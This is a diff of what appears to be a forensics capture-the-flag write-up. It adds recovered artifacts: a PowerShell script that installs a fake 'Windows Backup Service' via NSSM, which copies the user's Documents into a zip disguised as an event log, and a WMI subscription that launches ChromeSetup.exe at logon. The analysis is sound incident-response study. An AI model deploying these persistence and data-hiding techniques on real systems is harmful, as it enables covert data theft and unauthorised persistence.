@@ -82,14 +82,68 @@ HostApplication=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File
 Unfortunately, the script content wasn’t on disk. However, checking **`Microsoft-Windows-PowerShell`** logs (Event ID 4104), I found the executed PowerShell script:
 
 ```powershell
-while ($true) {
+Creating Scriptblock text (1 of 1):
+# Define paths
+$downloadFolder = "$env:USERPROFILE\Downloads"
+$zipUrl = "https://nssm.cc/release/nssm-2.24.zip"
+$zipPath = "$downloadFolder\nssm.zip"
+$extractPath = "$downloadFolder\nssm"
+$nssmPath = "$extractPath\nssm-2.24\win64\nssm.exe"
+
+# Create extract folder if it does not exist
+if (!(Test-Path -Path $extractPath)) {
+    New-Item -ItemType Directory -Path $extractPath | Out-Null
+}
+
+# Downloading NSSM
+Write-Host "Downloading NSSM"
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+Write-Host "NSSM downloaded"
+
+# Extract ZIP file
+Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+Write-Host "NSSM archive extracted"
+
+# Defin paths
+$scriptName = "WindowsBackup.ps1"
+$scriptPath = "$env:APPDATA\Microsoft\$scriptName"
+$serviceName = "WindowsBackupService"
+$serviceDisplayName = "Windows Backup Service"
+$backupFolder = "C:\Windows\System32\winevt\logs"
+
+# Generate backuper script
+$scriptContent = @"
+while (`$true) {
     try {
-        Compress-Archive -Path $env:USERPROFILE\Documents\* -DestinationPath C:\Windows\System32\winevt\logs\a.zip -Force
-        Remove-Item -Path "C:\Windows\System32\winevt\logs\Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
-        Rename-Item -Path "C:\Windows\System32\winevt\logs\a.zip" -NewName "Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
-    } catch {}
+        Compress-Archive -Path $env:USERPROFILE\Documents\* -DestinationPath $backupFolder\a.zip -Force
+        Remove-Item -Path "$backupFolder\Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
+        Rename-Item -Path "$backupFolder\a.zip" -NewName "Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
+    } catch {
+        # Silencieux
+    }
     Start-Sleep -Seconds 86400  # 24h
 }
+"@
+
+# Write script in hidden path
+Write-Host "[*] Writing backuper in $scriptPath"
+$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
+
+# Create Windows service
+Write-Host "[*] Creating rog service '$serviceName'"
+& "$nssmPath" install $serviceName "powershell.exe" "-ExecutionPolicy Bypass -WindowStyle Hidden -File $scriptPath"
+
+# Start service
+Write-Host "[*] Starting service..."
+Start-Service -Name $serviceName
+Write-Host "[*] Service started"
+
+
+# Cleaning
+#Remove-Item -Path $zipPath -Force
+#Remove-Item -Path $extractPath -Recurse -Force
+#Stop-Service WindowsBackupService
+#& "$nssmPath" remove WindowsBackupService confirm
 ```
 
 This script:
@@ -123,14 +177,22 @@ I felt close to solving the last flag. I merged event logs using [Merge_the_even
 Filtering between **16:25 - 16:30**, I found a **WMI Event Subscription**:
 
 ```powershell
+Namespace = //./root/subscription; Eventfilter = SU5TX1BBUlQze1dNSV9BbHdheXNfRG9lc19UaGVfSm9ifQ (refer to its activate eventid:5859); Consumer = CommandLineEventConsumer="ChromeUpdater"; PossibleCause = Binding EventFilter: 
 instance of __EventFilter
 {
-    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'";
+ CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 199, 232, 14, 165, 211, 36, 14, 5, 60, 207, 26, 5, 232, 3, 0, 0};
+ EventNamespace = "root\\\\cimv2";
+ Name = "SU5TX1BBUlQze1dNSV9BbHdheXNfRG9lc19UaGVfSm9ifQ";
+ Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'";
+ QueryLanguage = "WQL";
 };
+Perm. Consumer: 
 instance of CommandLineEventConsumer
 {
-    CommandLineTemplate = "cmd.exe /c C:\Users\User\Downloads\ChromeSetup.exe";
-    Name = "ChromeUpdater";
+ CommandLineTemplate = "cmd.exe /c C:\\Users\\User\\Downloads\\ChromeSetup.exe";
+ CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 199, 232, 14, 165, 211, 36, 14, 5, 60, 207, 26, 5, 232, 3, 0, 0};
+ Name = "ChromeUpdater";
+ RunInteractively = FALSE;
 };
 ```
 
